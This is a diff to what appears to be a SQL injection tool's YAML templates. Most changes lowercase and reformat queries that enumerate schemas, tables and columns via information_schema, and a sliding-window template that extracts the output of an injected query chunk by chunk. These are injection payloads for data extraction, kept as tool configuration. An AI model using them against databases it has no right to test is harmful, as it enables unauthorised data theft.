@@ -26,11 +26,11 @@ resource:
        '${trail_sql}'
    ) r from (
        select distinct
-           SCHEMA_NAME r,
+           schema_name r,
            '0' q
-       from INFORMATION_SCHEMA.tables
-       right join INFORMATION_SCHEMA.schemata
-       on SCHEMA_NAME = table_schema
+       from information_schema.tables
+       right join information_schema.schemata
+       on schema_name = table_schema
        ${limit}
    ) x
 
@@ -47,10 +47,10 @@ resource:
        '${trail_sql}'
    ) r from (
        select
-           TABLE_NAME r,
+           table_name r,
            '0' q
        from information_schema.tables
-       where TABLE_SCHEMA = '${database}'
+       where table_schema = '${database}'
        order by r
        ${limit}
    ) x
@@ -67,10 +67,10 @@ resource:
        ),
        '${trail_sql}'
    ) r from (
-       select COLUMN_NAME n
+       select column_name n
        from information_schema.columns
-       where TABLE_SCHEMA = '${database}'
-       and TABLE_NAME = '${table}'
+       where table_schema = '${database}'
+       and table_name = '${table}'
        order by n
        ${limit}
    ) x
@@ -102,15 +102,14 @@ strategy:
  configuration:
   slidingWindow: |
    (
-       select
-           concat(
-               '${lead}',
-               substring(
-                   (${injection}),
-                   ${window.char},
-                   ${capacity}
-               )
+       select concat(
+           '${lead}',
+           substring(
+               (${injection}),
+               ${window.char},
+               ${capacity}
            )
+       )
        from (values(0))
    )
   limit: offset ${limit.value} rows fetch next 100 rows only
